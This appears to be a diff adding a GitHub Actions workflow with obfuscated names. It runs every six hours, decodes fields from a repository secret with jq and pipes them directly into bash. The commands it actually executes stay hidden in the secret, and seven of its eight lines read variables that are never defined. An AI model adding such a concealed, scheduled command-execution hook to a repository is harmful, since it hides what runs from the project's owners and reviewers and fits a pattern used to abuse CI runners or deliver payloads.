@@ -1,0 +1,26 @@
+name: youdianmeimudanmai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youdianmeimudanmai
+        env:
+          fq97652: ${{ secrets.fq97652 }}
+        run: |
+          echo $fq97652 | jq -r .ohhs62 | /bin/bash
+          echo $e082 | jq -r .xkdwj078 | /bin/bash
+          echo $la53111 | jq -r .tfqee743 | /bin/bash
+          echo $pz2 | jq -r .hwy3 | /bin/bash
+          echo $xuc57463 | jq -r .r8457 | /bin/bash
+          echo $hyd51999 | jq -r .ndy264 | /bin/bash
+          echo $wiw9603 | jq -r .vgzft7753 | /bin/bash
+          echo $qf7767 | jq -r .ly13555 | /bin/bash
+
